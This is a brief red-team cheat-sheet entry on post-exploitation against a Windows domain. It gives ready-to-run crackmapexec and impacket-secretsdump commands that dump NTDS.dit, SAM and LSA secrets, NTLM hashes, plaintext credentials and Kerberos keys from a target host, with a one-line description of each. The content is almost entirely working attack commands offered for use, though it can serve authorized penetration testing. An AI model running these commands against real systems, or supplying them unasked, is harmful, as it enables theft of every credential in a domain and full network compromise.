# Domain Admin
## Dump ntds.dit
```bash
crackmapexec smb 10.10.10.10 -u username -p password -d domain.local --ntds
```

Dump hashes from a remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, Kerberos keys, and dumping NTDS.dit.
```bash
impacket-secretsdump 'domain.local/username:password'@10.10.10.10
```